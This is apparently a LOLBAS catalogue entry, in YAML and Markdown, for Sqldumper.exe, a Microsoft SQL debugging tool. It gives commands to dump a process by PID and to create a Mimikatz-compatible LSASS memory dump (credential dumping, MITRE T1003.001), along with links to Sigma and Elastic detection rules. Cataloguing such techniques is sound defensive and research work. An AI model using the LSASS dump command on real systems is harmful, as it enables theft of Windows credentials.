---
Acknowledgement:
- Person: Luis Ro
Author: Oddvar Moe
Commands:
- Category: Dump
  Command: sqldumper.exe 464 0 0x0110
  Description: Dump process by PID and create a dump file (Appears to create a dump
    file called SQLDmprXXXX.mdmp).
  MitreID: T1003
  OperatingSystem: Windows
  Privileges: Administrator
  Usecase: Dump process using PID.
- Category: Dump
  Command: sqldumper.exe 540 0 0x01100:40
  Description: 0x01100:40 flag will create a Mimikatz compatible dump file.
  MitreID: T1003.001
  OperatingSystem: Windows
  Privileges: Administrator
  Usecase: Dump LSASS.exe to Mimikatz compatible dump using PID.
Created: 2018-05-25
Description: Debugging utility included with Microsoft SQL.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_susp_sqldumper_activity.yml
- Elastic: https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_lsass_memdump_file_created.toml
- Elastic: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml
Full_Path:
- Path: C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft
    Analysis\AS OLEDB\140\SQLDumper.exe
- Path: C:\Program Files\Microsoft Power BI Desktop\bin\SqlDumper.exe
Name: Sqldumper.exe
Resources:
- Link: https://twitter.com/countuponsec/status/910969424215232518
- Link: https://twitter.com/countuponsec/status/910977826853068800
- Link: https://support.microsoft.com/en-us/help/917825/how-to-use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-se
mitre_data:
  technique_ids:
  - T1003
  - T1003.001
tags:
- lolbas/othermsbinaries
---

# Sqldumper.exe

Debugging utility included with Microsoft SQL.

# Path(s)

- `C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe`
- `C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe`
- `C:\Program Files\Microsoft Power BI Desktop\bin\SqlDumper.exe`

# Dump Commands

Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).

```batch
sqldumper.exe 464 0 0x0110
```

- **Usecase:** Dump process using PID.
- **Privileges Required:** Administrator
- **MitreID:** `T1003`
- **Operating System(s):** Windows



0x01100:40 flag will create a Mimikatz compatible dump file.

```batch
sqldumper.exe 540 0 0x01100:40
```

- **Usecase:** Dump LSASS.exe to Mimikatz compatible dump using PID.
- **Privileges Required:** Administrator
- **MitreID:** `T1003.001`
- **Operating System(s):** Windows



# Resource(s)

- https://twitter.com/countuponsec/status/910969424215232518
- https://twitter.com/countuponsec/status/910977826853068800
- https://support.microsoft.com/en-us/help/917825/how-to-use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-se
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Luis Ro